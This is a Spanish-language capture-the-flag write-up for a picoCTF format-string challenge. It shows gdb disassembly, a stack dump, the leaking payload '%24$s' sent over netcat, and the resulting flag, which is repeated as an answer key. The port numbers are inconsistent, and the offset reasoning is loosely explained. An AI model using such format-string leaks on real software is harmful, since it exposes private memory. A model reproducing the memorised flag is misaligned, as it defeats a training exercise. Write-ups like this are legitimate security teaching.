## Descripción

Story telling class 1/2 I'm just copying and pasting with this program. What can go wrong? You can view source here. And connect with it using: nc saturn.picoctf.net 63867

## Pistas

1. Format Strings

## Solución

```python()
1. Analizamos el código.
2. Observamos que en el codigo hay ver  una vulnerabilidad de cadena de formato en `vuln` la función llamando a . `printf(story)`. Usando eso, podemos filtrar la cadena de la bandera de la pila.
3. Encontramos cuál es la ubicación en la pila del `flag`búfer usando `gdb`:
```

```bash()
(gdb) disassemble vuln
Dump of assembler code for function vuln:
   0x08049333 <+0>:     endbr32
   0x08049337 <+4>:     push   %ebp
   0x08049338 <+5>:     mov    %esp,%ebp
   0x0804933a <+7>:     push   %ebx
   0x0804933b <+8>:     sub    $0xc4,%esp
   0x08049341 <+14>:    call   0x80491f0 <__x86.get_pc_thunk.bx>
   0x08049346 <+19>:    add    $0x2cba,%ebx
   0x0804934c <+25>:    sub    $0x8,%esp
   0x0804934f <+28>:    push   $0x40
   0x08049351 <+30>:    lea    -0x48(%ebp),%eax
   0x08049354 <+33>:    push   %eax
   0x08049355 <+34>:    call   0x80492b6 <readflag>
   0x0804935a <+39>:    add    $0x10,%esp
   0x0804935d <+42>:    sub    $0xc,%esp
   0x08049360 <+45>:    lea    -0x1f9c(%ebx),%eax
   0x08049366 <+51>:    push   %eax
   0x08049367 <+52>:    call   0x80490f0 <printf@plt>
   0x0804936c <+57>:    add    $0x10,%esp
   0x0804936f <+60>:    sub    $0x8,%esp
   0x08049372 <+63>:    lea    -0xc8(%ebp),%eax
   0x08049378 <+69>:    push   %eax
   0x08049379 <+70>:    lea    -0x1f6d(%ebx),%eax
   0x0804937f <+76>:    push   %eax
   0x08049380 <+77>:    call   0x8049180 <__isoc99_scanf@plt>
   0x08049385 <+82>:    add    $0x10,%esp
   0x08049388 <+85>:    sub    $0xc,%esp
   0x0804938b <+88>:    lea    -0x1f67(%ebx),%eax
   0x08049391 <+94>:    push   %eax
   0x08049392 <+95>:    call   0x8049120 <puts@plt>
   0x08049397 <+100>:   add    $0x10,%esp
   0x0804939a <+103>:   sub    $0xc,%esp
   0x0804939d <+106>:   lea    -0xc8(%ebp),%eax
   0x080493a3 <+112>:   push   %eax
   0x080493a4 <+113>:   call   0x80490f0 <printf@plt>
   0x080493a9 <+118>:   add    $0x10,%esp
   0x080493ac <+121>:   sub    $0xc,%esp
   0x080493af <+124>:   push   $0xa
   0x080493b1 <+126>:   call   0x8049170 <putchar@plt>
   0x080493b6 <+131>:   add    $0x10,%esp
   0x080493b9 <+134>:   nop
   0x080493ba <+135>:   mov    -0x4(%ebp),%ebx
   0x080493bd <+138>:   leave
   0x080493be <+139>:   ret
End of assembler dump.
```

```python()
4. Se establece un punto de interrupción después de la función readflag().
5. Observamos el estado de la pila en este punto:
```

```bash()
(gdb) r
Starting program: /pictoctf2022/binary_exploitation/flag_leak/vuln 

Breakpoint 2, 0x0804935a in vuln ()

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfa0│+0x0000: 0xffffd030  →  "sdfs\n"  ← $esp
0xffffcfa4│+0x0004: 0x00000040 ("@"?)
0xffffcfa8│+0x0008: 0xf7dc78e8  →  0x00000000
0xffffcfac│+0x000c: 0x08049346  →  <vuln+19> add ebx, 0x2cba
0xffffcfb0│+0x0010: 0xf7dd0ee8  →  0x00002ed0
0xffffcfb4│+0x0014: 0xffffffff
0xffffcfb8│+0x0018: 0xffffcfe0  →  0xf7fa5d20  →  0xfbad2087
0xffffcfbc│+0x001c: 0xf7dcc8a8  →  0x00002f07
```

```python()
6. Filtramos el lugar 24 (0x0018) en la pila. Podemos hacerlo usando `%24$s` de la carga útil:
```

```bash()
nc saturn.picoctf.net 58009
Tell me a story and then I'll tell you one >> %24$s
Here's a story - 
picoCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}
```

## Bandera

picoCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}

## Notas adicionales